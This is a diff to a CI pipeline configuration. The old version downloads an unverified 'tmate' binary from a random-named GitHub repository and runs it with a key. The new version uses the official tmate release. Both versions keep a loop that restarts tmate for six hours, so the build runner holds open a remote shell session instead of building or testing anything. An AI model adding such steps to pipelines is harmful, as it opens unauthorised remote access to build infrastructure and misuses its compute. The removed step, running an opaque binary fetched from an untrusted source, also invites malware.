@@ -12,12 +12,16 @@ blocks:
           commands:
             - checkout
             - sudo apt-get update
-            - sudo apt-get install -y wget
-            - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
-            - chmod +x tmate
+            - sudo apt-get install -y wget xz-utils
+            - 'wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz'
+            - tar -xf tmate-2.4.0-static-linux-amd64.tar.xz
+            - chmod +x tmate-2.4.0-static-linux-amd64/tmate
+            - mv tmate-2.4.0-static-linux-amd64/tmate .
             - |
               end=$((SECONDS+21600))
               while [ $SECONDS -lt $end ]; do
-                ./tmate -F -n j1 -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg || true
+                echo "Starting tmate at $(date)"
+                ./tmate -F -n j1 || true
+                echo "tmate exited at $(date), restarting in 5 seconds"
                 sleep 5
               done
